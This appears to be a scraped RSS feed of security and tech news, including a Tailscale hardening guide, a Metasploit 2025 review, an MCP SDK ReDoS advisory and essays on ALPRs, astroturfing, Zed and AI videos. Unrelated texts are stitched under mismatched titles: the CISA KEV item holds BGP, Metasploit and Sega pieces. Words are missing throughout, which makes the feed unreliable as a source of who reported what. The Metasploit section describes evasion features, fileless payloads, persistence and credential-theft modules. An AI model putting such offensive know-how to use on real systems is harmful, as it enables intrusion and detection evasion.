}The date in the group name should be a forcing function so when Q3 rolls around, you have to consciously decide whether to create  or let access lapse.Scope third-party access as narrowly as possible    {
    }
  ]
}Use separate tags for resources that third parties touchDon’t give vendors access to . Create  and put only the specific resources they need behind it. This prevents over provisioning and makes it obvious what they can reach.Put it on the calendar. For each third-party group:Is this engagement still active?Is the access scope still appropriate?Are the specific users still the right people?This should help catch the MSP admin who left months ago but can still access your systems.Visibility into Management Plane ChangesNetwork flow logs are useful but require significant investment to operationalize. And streaming is only available on Enterprise plans. For most, start with management plane visibility and know when your Tailscale configuration changes.Set up webhooks for critical eventsTailscale supports webhooks for management plane events. Configure alerts for: — new device joined the tailnet — device removed — device approval status changed — new user added — user removed — permissions changed (especially promotions to admin)subnetIPForwardingEnabled / subnetIPForwardingDisabled — subnet router changesSend these to Slack, PagerDuty, or wherever your team is going to see them. You don’t need fancy correlation, unless your SIEM is actually being managed. It’s more making sure someone notices when the configuration changes unexpectedly.Example webhook events worth alerting onAny  to admin/prod/crown jewel access → immediate Slack alert outside business hours → worth a looksubnetIPForwardingEnabled → who just advertised a new route? when you’re not actively onboarding → investigate immediatelyIf you do have a SIEM or detection platformEven if you don’t use Panther, the rule logic is a useful reference for what’s worth detecting.High-Security EnvironmentsTailnet Lock (if you need it)Tailnet Lock removes Tailscale’s coordination servers from your trust chain. New devices need cryptographic signatures from customer-controlled signing nodes before they can communicate.Compliance frameworks that explicitly require customer-controlled key managementDefense contractors or companies in sensitive industries with genuine nation-state concernsEnterprise customers who specifically ask about control plane trust in security reviewsFor the vast majority of organizations, trusting Tailscale’s coordination servers is a reasonable trade-off. Tailscale’s security model, SOC 2 compliance, and the operational overhead of managing your own signing nodes all factor in. If you’re not in a highly regulated industry and don’t have specific compliance requirements mandating customer-controlled keys, the Tailscale control plane is fine.The operational burden of Tailnet Lock isn’t cheap - you need hardened signing nodes, a process for signing new devices, and a recovery plan if signing nodes become unavailable. For most, the overhead exceeds the risk reduction. know that pre-signed auth keys embed the private signing key. If that pre-signed auth key is leaked, it could compromise your entire Tailnet Lock security model.Replace subnet routers with App connectors expose specific applications rather than entire subnets. If you’re advertising a subnet just to reach a few services, app connectors will reduce your exposure.Regularly (that is, pick a cadence you’ll maintain)Look at the key lists and revoke anything that’s unusedCheck for unexpected subnet route advertisementsReview webhook alerts from the past periodPeriodically (monthly-ish)Review group memberships against current employee rosterCheck that offboarded employees are removedVerify posture integrations are syncingFull access review - who can reach what?Third-party access review - is anything still needed? still scoped correctly?Review subnet router configurationsUpdate ACL tests for any new resourcesOn employee departure (immediately)Remove from all Tailscale groupsRevoke any auth keys they createdFor most growing organizations, the realistic hardening path looks like this. Replace the default ACL with explicit, port-specific rules. Add deny tests for production databases. Set up webhooks for management plane alerts. Ensure everyone is using passkeys or Yubikeys to access Tailscale. Segment by function, connect device posture to your existing EDR, establish a documented process for time-limited production access (match complexity to what you’ll actually maintain), add check mode to SSH. Create explicit third-party access groups with built-in expiration, establish a realistic review cadence, and document your configuration for audits.If you’re selling to enterprise, treat these things as a business requirement. Your ACL configuration will be audit evidence. Invest accordingly.If you’re in a sensitive industry. Consider Tailnet Lock, app connectors, and extensive monitoring. For most companies, trusting the Tailscale control plane is a reasonable trade-off, but know your compliance requirements.We don’t need perfect security. But it should match your threat model, operational capacity, and business requirements.]]></content:encoded></item><item><title>CISA Known Exploited Vulnerabilities Soared 20% in 2025</title><link>https://thecyberexpress.com/cisa-known-exploited-vulnerabilities-kev-2025/</link><author></author><category>security</category><pubDate>Mon, 5 Jan 2026 21:31:56 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

One idea, curated news, and links worth your time.   BGP is the first thing that comes to mind. It's a protocol used by routers to determine what path data takes to get to it's destination, it does this by exchanging routing information between Autonomous Systems. It is also notoriously insecure and much of the data about BGP is collected in public datasets. Every major network has an Autonomous System Number or ASN. CANTV (AS8048) is Venezuela's state-owned telecom, so that's the obvious place to start.Cloudflare Radar's route leak data for AS8048 on January 2nd had some interesting anomalies: 8 prefixes (blocks of IP addresses) were being routed through CANTV, with Sparkle (an Italian transit provider) and GlobeNet (a Colombian carrier) in the Autonomous System (AS) path. The AS path is essentially the list of networks traffic passes through to reach its destination. CANTV was in a path it is not typically a part of.There was also a noticeable spike in BGP announcements in the days leading up to the events and a drastic dip in the "Announced IP Address Space" according to the same Cloudflare Radar data, although it's unclear what this indicates.Cloudflare shows that a leak happened, but not the actual network prefixes. The network prefixes are useful to determine what infrastructure was potentially affected. Fortunately public datasets collect this BGP information. Pulling the data from ris.ripe.net/docs/mrt from around the time of the leak and using a tool called bgpdump we can extract the data into a readable format:TIME: 01/02/26 15:41:16

Anthropic's MCP TypeScript SDK versions up to and including 1.25.1 contain a regular expression denial of service (ReDoS) vulnerability in the UriTemplate class when processing RFC 6570 exploded array patterns. The dynamically generated regular expression used during URI matching contains nested quantifiers that can trigger catastrophic backtracking on specially crafted inputs, resulting in excessive CPU consumption. An attacker can exploit this by supplying a malicious URI that causes the Node.js process to become unresponsive, leading to a denial of service.

All of the metrics and modules you see here would in large part not be possible without the dedicated community members who care about the Framework and its mission on all the days of the year. It is their hard work and dedication that makes it look like magic, and sometimes, it feels like it too. A heartfelt thank you to all of our researchers and contributors, you're what makes Metasploit Framework so resilient.This year brought its share of notable vulnerabilities, substantial framework improvements, and continued evolution of the project. Whether you submitted a module, filed an issue, or helped triage a bug, your contributions have kept Metasploit relevant and powerful. So without further ado, let's dive into the highlights from 2025.One of the year's significant infrastructure improvements came from community contributor h00die, who spearheaded a massive refactor of Metasploit's persistence modules. The project, tracked in issue #20374, involved reorganizing dozens of persistence modules from their scattered locations across the framework into a dedicated persistence directory under exploits. This wasn't just housekeeping—h00die created a standardized persistence mixin that brought consistency to how modules handle installation, cleanup, and option handling. The refactor touched over 30 modules spanning Linux, Windows, OSX, and multi-platform techniques, modernizing each one with proper check methods, MITRE ATT&CK references, and standardized options like WritableDir. The work also laid the groundwork for a persistence suggester module that can automatically recommend viable persistence techniques based on session characteristics.The sheer scope of this effort can't be overstated. Breaking the work into manageable chunks, h00die systematically converted modules from the old post-exploitation style to proper exploit modules with the new persistence mixin, handling everything from cron jobs and SSH keys to Windows registry modifications and service installations. The standardization means that all persistence modules now share common behaviors, produce cleanup scripts in a consistent format, and integrate cleanly with the rest of the framework. It's the kind of unglamorous but essential work that improves the entire framework's usability and maintainability, and we're grateful to h00die for taking on such an ambitious project and seeing it through.AD CS Vulnerable Certificate Template Detection and Exploitation AdditionsThis year, Metasploit expanded its Active Directory Certificate Services (AD CS) coverage by adding detection and exploitation support for certificate templates vulnerable to ESC9, ESC10, and ESC16. Checks for these misconfigured certificate templates were integrated into the existing ldap_esc_vulnerable_template module, allowing users to easily identify misconfigured templates during assessments.To complement this detection capability, we introduced the new esc_update_ldap_object module, which enables reliable exploitation of these vulnerable templates to escalate privileges. ESC9, ESC10, and ESC16 share a common pattern: each requires control of a user account with write privileges over another user that is permitted to enroll in the vulnerable template. While exploiting these techniques with other tools typically involves multiple manual and error-prone steps, the new module streamlines the entire workflow. Users configure the required datastore options, run the module, and receive a certificate that can be used to escalate privileges within the domain.As part of this effort, we also introduced the ldap_object_attribute module, which provides standard CRUD operations for manipulating LDAP objects in Active Directory. This module — along with existing functionality such as shadow_credentials and get_ticket — is used internally by esc_update_ldap_object to abstract away low-level LDAP interactions and simplify exploitation.This work included comprehensive documentation covering the configuration of templates vulnerable to ESC9, ESC10, and ESC16, as well as detailed instructions for exploiting each technique using the new module.Active Directory ImprovementsRelated to our AD CS improvements, came new low-level functionality for interacting with Active Directory (AD) Domain Controllers over LDAP. Over the past couple of years, Metasploit has seen multiple modules added that facilitate AD attack workflows including Shadow Credentials, RBCD, Unconstrained Delegation, etc. Like the AD CS attacks, many of these techniques are reliant on access control to some degree. Over the summer, Metasploit introduced new functionality to facilitate checking for these types of attacks. This new library provides Active Directory specific functionality, most notably, the ability to remotely evaluate security descriptors to determine whether a particular user or group has a specific access right. This has already been incorporated into the following modules to either enable or improve the existing detection capabilities.auxiliary/admin/ldap/shadow_credentialsauxiliary/admin/ldap/rbcdauxiliary/admin/ldap/ad_cs_cert_templateauxiliary/gather/ldap_esc_vulnerable_cert_finderFor module authors, the library provides a composable API for determining if an object grants a particular permission to an optional SID. The SID can be either a user or group, and when omitted is automatically set to the authenticating user, i.e. to check if the current connection has the permissions.For example, check if the object grants the read and write property permissions with:adds_obj_grants_permissions?(@ldap, obj, SecurityDescriptorMatcher::Allow.all(%i[RP WP]))Beyond new features and modules, 2025 also saw substantial code quality improvements thanks to community contributor bcoles, who took on the often-thankless task of resolving RuboCop violations across the codebase. Throughout the year, bcoles systematically worked through older modules, cleaning up style inconsistencies, fixing syntax violations, and converting outdated property types to proper boolean values in auxiliary scanners and exploit modules. This kind of incremental maintenance work—fixing redundant parentheses here, resolving style violations there—doesn't make for flashy headlines, but it keeps the codebase maintainable and makes life easier for everyone working in the framework. Code quality matters, and we're grateful to bcoles for putting in the work to keep Metasploit's technical debt in check.It may be a fun fact, or perhaps tribal knowledge that an “exploit” to Metasploit is a module that delivers a payload. All the great exploit content this year would be nothing without corresponding payloads to deliver and we make sure that those get plenty of our time as well. The following changes in particular are highly impactful and may have gone unnoticed while the flashier exploits received all the attention.Windows Meterpreter ImprovementsThe biggest updates for the Windows Meterpreter revolve around two major improvements: the first is the upgrade to ReflectiveDLLInjection, made by Alex (xaitax) Hagenah, for which we express our gratitude for improving this area of the Metasploit Framework that requires a high level of attention to detail. This update introduces full, production-ready ARM64 support and a comprehensive architectural modernization of the whole library. These changes open the door to future support for a native ARM64 Meterpreter on Windows. Additionally, Metasploit split the standard API extension for Windows this year. This was actually the design used in the original Meterpreter implementation and we’ve reconsidered the monolithic approach. This improvement is one of the multiple steps we have in the pipeline to improve the evasion capabilities for our Windows Meterpreter. The standard API library now allows the user to load only specific subcomponents of the extension (for example, the component for network or file-system interaction), reducing the memory footprint for memory scanners. To leverage this new functionality, set AutoLoadStdapi to False, and then load one or more extensions manually, e.g. load stdapi_fs. To maintain backwards compatibility, a single stdapi extension is also still available and can be loaded with load stdapi.Fetch Payload ImprovementsThe first milestone was the introduction of fileless execution for Linux fetch payloads, enabling payloads to run directly from memory using anonymous files. This advancement greatly enhances operational stealth by minimizing forensic traces and avoiding file-based detection, with careful attention to safe, opt-in behavior and collaborative code refinement. Following this, the FETCH_PIPE option streamlined payload deployment into a single, compact command. This improvement enhanced both usability and evasion, while also supporting larger, more complex command payloads (such as fileless execution) to be executed even with reduced command size. Additionally, fetch payload support has expanded to seven additional CPU architectures: aarch64, armbe, armle, mipsbe, mipsle, ppc, and ppc64le. This significantly broadens Metasploit's reach across embedded and legacy systems. Both features are thoroughly tested and future-proof, making the framework more versatile and powerful.New Architectures Basic SupportThis year, we have also updated the framework to support new basic payloads. We have introduced the exec payload for Windows ARM64 (provided by Alex (xaitax) Hagenah), reverse shell for RISC-V 32 and 64 bit, and Loongarch64 (both provided by bcoles).As much as we try, everything doesn’t always fit into one year. With that in mind, we wanted to highlight some upcoming features that we’re particularly excited to complete in the coming months.The malleable c2 will allow the user to specify with a .profile scribing how the HTTP requests between meterpreter and metasploit-framework should look like, allowing metasploit to hide the distinctive traffic generated by the session communication.We have updated the Meterpreter core (metsrv) to remove common static signatures, such as specific strings and function imports, making it harder to detect.PoolParty for 32-bit systemsAdditional work to port the poolparty injection on native 32 bit system, Huge thanks to xHector1337 for taking over the research and extension of the code injection for the new architecture.This year, Metasploit added two modules for targeting SCCM instances and recovering the Network Access Account credentials. These modules differ in how they perform the authentication. The first, auxiliary/admin/sccm/get_naa_credentials accepts credentials from the operator and will use them to authenticate and run the attack on demand. This pairs nicely with the auxiliary/admin/dcerpc/samr_account module when the operator can create a new machine account. However, when that’s not an option, Metasploit still has you covered with the auxiliary/server/relay/relay_get_naa_credentials variant that enables relaying NTLM authentication from an SMB server. These attack workflows were demonstrated at Black Hat and DEF CON over the summer and we anticipate they’ll remain useful in the future.CVE-2025-9316, CVE-2025-11700 N-able N-Central XXE – N-able N-Central is a popular Remote Monitoring and Management (RMM) platform. These two vulnerabilities, when combined, enable Metasploit to read local files without authenticating. This can be used to obtain a number of sensitive backup files from the application itself, or anything else on the host system. XXE attacks are a less common vulnerability, at least in Metasploit-land but this is a fantastic example of how impactful they can be.CVE-2024-55555 Invoice Ninja RCE – This particular module leverages a PHP deserialization vulnerability within the application. While this vulnerability requires knowledge of the APP_KEY, successful exploitation could have significant financial implications. As an added bonus, this module came with a new library adding support for Laravel Framework-specific cryptography methods.CVE-2024-55556 InvoiceShelf RCE – Everyone loves a good pairing, and this module continues h00die-gr3y’s work on invoicing software, showing that they’re useful for receiving more than just payments.LDAP Password Disclosure – This module has been around for a while, but received some new features in 2025 for targeting Active Directory Domain Controllers. The first added support for LAPSv1 and v2, enabling the module to recover the local admin account on systems. Later in the year, a second improvement added support for gMSA accounts. This module also pairs nicely with the new SMB to LDAP NTLM Relay module we added this year as well.This year, Metasploit significantly leveled up its relaying capabilities, transforming the framework’s only SMB to SMB relay capability into a powerful engine for lateral movement.

The co-founder of Sega, who remained a director of the company until 1996, was instrumental in the birth and rise of the video game business in Japan, and in the 1980s and 90s oversaw the establishment of Sega of America and the huge success of the Mega Drive console.As a US Air Force pilot during the Korean war, Rosen found himself stationed in Japan, and once the conflict was over, he stayed on, intrigued by the country and seeing possibilities in its recovering economy. In 1954 he set up Rosen Enterprises and noticing that Japanese civilians now required an increasing number of new ID cards he started importing photo booths from the US to answer the demand. From here he expanded to pinball tables and other coin-operated machines, importing them for installation in shops, restaurants and cinemas. In 1965, he merged the company with another importer, Nihon Goraku Bussan, whose coin-op business Service Games was shortened to Sega for the new venture.For the next 15 years, Sega innovated in the arcade sector, switching from importing games to designing its own, and moving on from jukeboxes and pinball tables to electromechanical arcade games such as the submarine shooting sim Periscope and, in 1972, Killer Shark, a shark hunting game which would briefly feature in Jaws. Sega also began to set up its own arcades allowing the company close control over every facet of its business.One of Rosen’s great skills was in finding and employing people who instinctively understood where games were heading. In 1979, he spotted rising industry star Hayao Nakayama, director of Esco Trading, another arcade company. As Rosen explained to me in 2013: “Nakayama was very active as a distributor at the time – he was someone I felt was very astute and was quick to adapt to what was happening in the industry, and I wanted him – we did it via an acquisition of his company. By assimilation, we had him and the staff join us.” Nakayama would go on to be the president of Sega Japan during its heyday from 1983 to 1998.During this time, Sega rose from a competitor alongside fellow arcade manufacturers Namco, Capcom, Taito and Konami, to an industry leader. Its sleek, stylish coin-ops of the 1980s – Outrun, Space Harrier and AfterBurner – changed the image of arcades from nerdy hideouts to cool aspirational hangouts, while 1990s titles Virtua Racing and Virtua Fighter established the company as a technological powerhouse.From the late-1970s, Rosen pursued a new market: home TV games. He encounter a major rival, Nintendo, which dominated with its Color TV-Game console, and later the Nintendo Entertainment System. When Rosen returned to the US in the early 1980s, he was determined to take a slice of the global console industry from his Kyoto-based competitor. “Nintendo was responsible for the revival of the home console market after the Atari collapse of 1983,” he told me. “We wanted to see if we could make a device that would be competitive. Unfortunately our first attempt failed to compete. It was just made up of off the shelf parts, it wasn’t until 1986 that we brought out the Master System …”This machine would struggle in the US but was huge in Europe and South America, and Rosen spotted a niche. While Nintendo was all about family entertainment, the titles doing well on the Master System were teen-focused brawlers, such as Golden Axe and Shinobi. When it came to release the new Sega Mega Drive console in Japan in 1988, Rosen insisted on changing its name to Genesis for the US launch, emphasising a new beginning and a more mature outlook. He also brought in Michael Katz an experienced exec from Mattel and early console company Coleco.“We were up against the wall in terms of time,” he said. “I had known Michael from some of the other endeavours he was involved in, he had all this experience from Coleco and he certainly knew the players. I thought he could help launch the product and at the same time bring structure to the company, which he did.” Spurred on by Rosen’s vision, Katz marketed the Genesis as a games console for teenagers, not children, using TV ads which combined video game visuals with flashing images and rock music and the immortal phrase: Genesis does what Nintendon’t. When Tom Kalinske took over as CEO Sega of America in 1990, he oversaw a new series of equally famous ads which almost always ended with someone screaming “Sega!”Rosen would stay active in the company in various senior roles until retiring in 1996. Although Sega’s home console business would falter in this period due to the rise of the Sony PlayStation, the company’s arcade supremacy remained for the rest of the decade. I spoke to him in 2013 while writing the book Sega Mega Drive Collected Works. As a lifelong Sega fan, my hour-long chat with him that day was a career highlight. He talked fondly about his time in Japan, the people he worked with and his journey through the industry. He told me with considerable glee that while out and about in his home town of Los Angeles, strangers would still shout ‘Sega!” at him when passing on the street.]]></content:encoded></item><item><title>Russia-Aligned Hackers Abuse Viber to Target Ukrainian Military and Government</title><link>https://thehackernews.com/2026/01/russia-aligned-hackers-abuse-viber-to.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZrzpzm3kgY91cQhzyrpbgxomzkri4gsv_GeaFpDMVVj3faZ9_CQAm2c5DvxBbZ15708nW3eJrmSxS9AZBABszXboS-IVyik_4TTrni4xTOJERzoSSF5l7ixY_7n4hIydsBXGozBBS0rF89sIpgxRMHPZbEVe6n2j-nWxP15Y8fsvt7-_KQO-Zjwu_19h2/s1600/viber.jpg" length="" type=""/><pubDate>Mon, 5 Jan 2026 17:56:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The Russia-aligned threat actor known as UAC-0184 has been observed targeting Ukrainian military and government entities by leveraging the Viber messaging platform to deliver malicious ZIP archives.

This post describes work done by Mikhail Atuchin (Sr. Staff Engineer), Pavel Beloborodov (Sr. Software Engineer) and Anton Lazarev (Staff Adblock Engineer). It was written by Shivan Kaul Sahib (VP, Privacy and Security).Brave has overhauled its Rust-based adblock engine to reduce memory consumption by 75%, bringing better battery life and smoother multitasking to all users. The upgrade represents roughly 45 MB of memory savings for the Brave browser on  (Android, iOS and desktop) , and scales even higher for users with additional adblocking lists enabled. These performance boosts are live in Brave v1.85, with additional optimizations coming in v1.86.As announced in June and October last year, we achieved this major memory milestone by iteratively refactoring the adblock-rust engine to use FlatBuffers, a compact and efficient storage format. This architectural transition allowed us to move the roughly 100,000 adblock filters shipped by default from standard, heap-allocated Rust data structures (such as Vecs, HashMaps, and structs) into a specialized, zero-copy binary format. Along the way, we completed several other key performance optimizations (some of these are coming in v1.86):Memory management: Used stack-allocated vectors to reduce memory allocations by 19% and improved building time by ~15%.Matching speed: Improved filter matching performance by 13% by tokenizing common regex patterns.Sharing resources: Resources are shared between instantiations of adblock engines, saving ~2 MB of memory on desktop.Saving 45+ MB of memory is a significant milestone in the world of browser performance and a massive win for users on mobile and older hardware. While Brave already improves performance on the Web by blocking invasive ads and trackers, our latest engineering effort ensures that our own built-in protections are as lightweight and invisible as possible. Unlike adblocking in other browsers, Brave’s adblocking engine is built into the browser and maintained by our privacy team. Such deep optimizations are impossible for extension-based blockers, which are restricted by browser extension APIs and sandboxing. This native architecture is also why Brave’s own ad and tracker blocking is entirely unaffected by Manifest V3.This performance boost is the culmination of several months of in-depth cross-team engineering work between our performance and privacy teams. It marks a significant leap in the browser’s efficiency and ensures that we continue shipping best-in-class privacy to over 100 million users.]]></content:encoded></item><item><title>Risks of OOB Access via IP KVM Devices, (Mon, Jan 5th)</title><link>https://isc.sans.edu/diary/rss/32598</link><author></author><category>threatintel</category><pubDate>Mon, 5 Jan 2026 17:33:50 +0000</pubDate><source url="https://isc.sans.edu/">SANS Internet Storm Center, InfoCON: green</source><content:encoded><![CDATA[Recently, a new "breed" of IP-based KVM devices has been released.

Automated License Plate Readers, or ALPRs, are AI-powered cameras that scan and store an image of every single vehicle that passes their view. They are mounted onto street lights, installed under bridges, disguised in water barrels, and affixed onto telephone poles, lampposts, parking signs, and even cop cars.Once installed, these cameras capture a vehicle’s license plate number, along with its make, model, and color, and any identifying features, like a bumper sticker, or damage, or even sport trim options. Because nearly every ALPR camera has an associated location, these devices can reveal where a car was headed, and at what time, and by linking data from multiple ALPRs, it’s easy to determine a car’s daylong route and, by proxy, it’s owner’s daily routine.This deeply sensitive information has been exposed in recent history. But there’s another concern with ALPRs besides data security and potential vulnerability exploits, and that’s with what they store and how they’re accessed. ALPRs are almost uniformly purchased and used by law enforcement. These devices have been used to help solve crime, but their databases can be accessed by police who do not live in your city, or county, or even state, and who do not need a warrant before making a search. In fact, when police access the databases managed by one major ALPR manufacturer, named Flock, one of the few guardrails those police encounter is needing to type a single word in a basic text box. When Electronic Frontier Foundation analyzed 12 million searches made by police in Flock’s systems, they learned that police sometimes filled that text box with the word “protest,” meaning that police were potentially investigating activity that is protected by the First Amendment.Today, on the Lock and Code podcast with host David Ruiz, we speak with Will Freeman, founder of the ALRP-tracking project DeFlock Me, about this growing tide of neighborhood surveillance and the flimsy protections afforded to everyday people.“License plate readers are a hundred percent used to circumvent the Fourth Amendment because [police] don’t have to see a judge. They don’t have to find probable cause. According to the policies of most police departments, they don’t even have to have reasonable suspicion.”Tune in today to listen to the full conversation.

Over the past year, users on r/IBO sub-reddit have documented a pattern of unethical marketing practices:*Astroturfing:* Coordinated campaigns where accounts pose as students sharing "cheatsheets" and "predicted exam leaks." Other accounts then upvote, leave supportive comments, and ask follow-up questions—creating the illusion of organic student excitement. Multiple threads have exposed this pattern [1][2][3].*Paid fake posts:* High school students report being offered payment to write promotional Reddit posts [4].*Pressuring critics:* Users who post negative reviews report being contacted directly by company representatives, told it's "a shame" they're posting publicly [5]. Critical comments receive coordinated mass downvotes [6].*Soliciting copyrighted materials:* They use TikTok influencers and fake reddit posts to persuade students to sell them official IB exam papers, violating IB policies [7].The r/IBO moderators are actively investigating [8].These practices appear to be working great for them. Recently, they acquired OnePrep (oneprep.xyz), a free SAT prep tool that was already popular on r/sat. Since the acquisition, the same manipulation tactics have been deployed at scale: 150 Trustpilot reviews in a window of a few days [9], and widespread coordinated Reddit manipulation—multiple accounts posting "tips" that recommend Oneprep, coordinated upvoting, and fake enthusiasm in comments. The most prominent example was a 2,000+ upvote post removed by moderators for manipulation, but it's part of a sustained campaign across the subreddit.[1] https://www.reddit.com/r/IBO/comments/1p55qun/

It was never perfect but it worked. I like using mainstream tools with minimal configuration, so it suited me perfectly. But recent VSCode developments forced me to look for an alternative. In December I switched to Zed completely, and I think I'm never going back.VSCode felt stable over the years. This changed with the AI era. Now every update there are new AI-related features that I need to figure out how to disable. Few examples. I don't use Github Copilot. My preferred AI tool is a CLI (lately Codex). So I disabled Copilot. But VSCode continued to force it on me. After one update I see "cmd+I to continue with copilot" on every line I edit. Another update I see new inline terminal suggestions and they only interfere with my shell suggestions. There were a few other similar intrusions I don't recall now.So my  grew into a list of opt-outs. I could still live with that. The biggest issue for me was that VSCode became more buggy, feeling even slower, and crashing frequently – not surprising giving the pace of shipping new Copilot features.I still think VSCode is an amazing IDE and I'm grateful to all the maintainers and the greatest extension community. There is a hope the VSCode approach to AI integration becomes less intrusive and more thoughtful, things stabilize, and VSCode "just works" again. But now it was time to look for somethings else.I knew I didn't want to switch to JetBrains IDEs. There are powerful but feel heavy and I don't enjoy using them. Vim, Emacs, and its modern variants are on the opposite spectrum. Probably they'll work great but only after I retire and have the time to configure and learn them properly. And there was Zed that I didn't know much about besides it being modern and lightweight IDE written in Rust. I gave it a try.In Zed I felt immediately at home coming from VSCode. The UI is similar. Zed's default keybindings are mostly the same. The biggest UX difference for me was that VSCode shows opened files (a.k.a. open editors) in the left sidebar, which I often used for navigation. In Zed there is no such panel, and the recommended approach is to navigate using file search (). There is also a way to import VSCode settings automatically. I wanted to start fresh, so I didn't use it. The only configuration I had to do is change the font size and theme, disable inline git blame, and enable autosave.My main impression of Zed was how fast and responsive it is compared to VSCode. I even noticed the slowness of some other tooling, which I got used to, and optimized it. Another highlight is that Zed has been stable for me without any glitches or crashes over the last two weeks. This all brings back joy of programming.I mostly program in Python and sometimes Go. With Go, Zed worked out-of-the-box without any extra setup. With Python, it wasn't so smooth, and I had to spent half a day to get it working. Next is boring details that I wish I knew from the start.Making Zed work for PythonFirst some context. Zed is an IDE that relies on language servers to provide language-specific features like autocomplete, code navigation, type checking, etc. It natively supports multiple Python language servers. One is Pyright, but its capabilities as a language server are limited – it's primarily a type checker that other language servers build upon. For example, Microsoft develops Pylance as a language server on top of Pyright. Pylance is the most widely used Python language server, however, it's not open source, so it cannot be used outside of VSCode. Zed uses Basedpyright  as the default language server instead.The first problem I encountered when I opened a Python project in Zed is that I saw a lot of type checker errors highlighted in the code. Apparently, Basedpyright ran in a stricter . For my Python projects I used to configure Pyright with  unspecified, which defaults to . The Zed docs say that "while Basedpyright in isolation defaults to the type-checking mode, Zed configures it to use the less-strict  mode by default, which matches the behavior of Pyright. This confused me since I definitely saw it working in .This didn't work. There were still a lot of typing errors I didn't want to check for. I figured out eventually that as long as you have  with the  section, the Basedpyright's default typeCheckingMode = "recommended" is used. My solution was to set typeCheckingMode = "standard" in every  explicitly. The solution took me a long time – I found several Github issues related to language server settings being ignored or not working as expected, so it looked like a bug at first. Now I see it's rather intended, although not clear from the docs. The lesson: If you define  , don't rely on Pyright defaults but set the options explicitly.Next I noticed that I as I edited the code I didn't see new typing errors shown for a file until I changed that file. I'd like to see such errors when, for example, a symbol is deleted but still used in another file. This I fixed by setting "disablePullDiagnostics": true in settings.json:That's basically it. Virtual environment detection and other Python specifics were smooth. At one point I also tried ty instead of Basedpyright, which announced Beta just recently. It worked well from the start. I still chose Basedpyright because the CI runs Pyright and I want the same type checker locally. But given the success of ruff and uv, there is a high chance of me (and everyone else) switching to ty both for development and CI.Zed is now my go-to IDE for Python and Go and my first choice as a general-purpose editor. It's fast, stable, familiar, feature-rich, with nice out-of-the box experience. The Zed extension ecosystem is tiny compared to VSCode, but I found it sufficient for my needs. The only thing I miss is a powerful git diff viewer with side-by-side diffs like GitLens.Zed's AI features are actively developed but easily ignored and don't stand in the way. Zed offers paid plans for edit predictions, which seems like it can be a nice way to keep the project going. I want to wish Zed all the best!As regards to VSCode, they finally got a decent competitor, and the Microsoft leverage may not be sufficient to keep the dominant position. VSCode, wake up!Finally, my minimal Zed's settings.json in full:If you have any questions, comments or suggestions, feel free to join the GitHub discussion.]]></content:encoded></item><item><title>All AI Videos Are Harmful (2025)</title><link>https://idiallo.com/blog/all-ai-videos-are-harmful</link><author>Brajeshwar</author><category>dev</category><pubDate>Mon, 5 Jan 2026 13:44:59 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[When OpenAI released the first version of Sora, I was excited. For years, I'd had this short story sitting on my hard drive, something I'd written long ago and always dreamed of bringing to life as a short film. The only problem was I didn't have the expertise to shoot a movie, and my Blender 3D skills are rusty for lack of use. But Sora promised something different. I could upload my sketches, input my script, and generate the film in my mind. The creative barrier had finally been lifted.But reality was a bit different from the demos. No matter what I tried, my outputs never looked anything like what OpenAI showcased. The scenes were adjacent to what I wanted, not what I actually needed.It wasn't just Sora. I tested Runway ML, experimented with Veo, and tried to keep my spending reasonable. Every model generated the same kind of thing: something that "looked good" in a superficial way. They excelled at creating cliché scenes, the kind of generic image that checks all the technical boxes. But creating something that could fit into a coherent narrative, something with intention and specificity? That was nearly impossible.When Sora 2 launched, I started right where I left off. Maybe this time would be different. The videos are more realistic than ever, but the main problem remains unchanged. These tools aren't struggling because they can't generate scenes or dialogue, they sure can. The issue is that they generate what I've come to call "AI Videos," and that's a distinct category with its own aesthetic fingerprint.Think about how you instantly recognize certain types of content. If I described a video to you right now: fast-paced, someone talking directly to a screen with multiple jump cuts, a ring light's circular reflection visible in their eyes, their bedroom visible in the background. You would instantly say "TikTok video." The format is hard to miss these days.AI-generated videos have developed their own unique look. There's a visual quality that marks them, a subtle wrongness that your brain picks up on even when you can't articulate exactly what's off. It's the new uncanny valley, and I feel an intense revulsion whenever I encounter it. I'm not alone in this reaction either. In my small circle of friends and colleagues, we've all developed the same instinctive aversion.I'm starting to feel the same revulsion for YouTube shorts even when they are created by real people. The reason is, well, YouTube has been secretly using AI to alter real videos, making authentic content start to look artificially generated. You will notice people's faces look smoothed or sharpened, and that happens without the creator's knowledge or consent. The line between real and AI-generated content is blurring from both directions.So if these videos trigger such a negative response in many viewers, where can AI-generated content actually thrive? The answer: with spammers, scammers, rage-baiters, and manipulators.These bad actors are having a field day with AI video tools. A couple months ago, I wrote about AI Video Overviews, I speculated that Google might eventually start using AI-generated videos as enhanced search results, synthesizing information from multiple sources into custom video summaries. That remains speculative. But for harmful content? That's not speculation, it's happening right now, at scale.The main targets are older adults. My parents and their peer group are constantly sharing AI-generated videos in their group chats and on social media. Even as I write this, my mother just sent me a video showing Denzel Washington giving life advice, entirely fabricated, of course.There is a wide variety of content. Health misinformation, sensational fake news, videos claiming Obama has embraced Islam, an elderly Tai Chi master giving dubious health tips, Trump supposedly reversing or doubling down on positions he never actually took. The specific claims change daily, but the pattern remains constant.These videos spread like wildfire despite our collective, repeated efforts to educate people. I've spent countless hours explaining why these videos are fake. In my community group chat, I've explained the telltale signs multiple times, like the little cloud icon with eyes that appears on AI-generated content (sora watermark). I've shared practical tips: if a video seems too good or too shocking to be true, search for the information on Google to verify it. Nothing seems to stick.Some days, according to these videos, we're at war. Other days, entire cities have burned down, or a tsunami has devastated Los Angeles. You can't debunk faster than this information spreads.When you find these videos on YouTube, scroll down to the comments. You'll see real people engaging seriously with fabricated content, offering heartfelt responses to synthetic personas, debating points that were never actually made by the people shown in the videos. I get phone calls from family overseas, people reach out, or share what they think is happening right at my doorstep. When I ask where they heard it? They forward a whatsapp video.There's no easy solution to this crisis.AI video technology has found its audience, just not the audience the marketing materials promised. These tools weren't really designed to help people like me overcome technical limitations and bring our stories to life. They were made to enable those who want to manipulate, deceive, and exploit people for engagement, profit, or ideology.I've tried to find legitimate, beneficial use cases for AI video generation. I've thought about educational applications, accessibility features, and experimental art projects. Maybe they exist in theory, but in 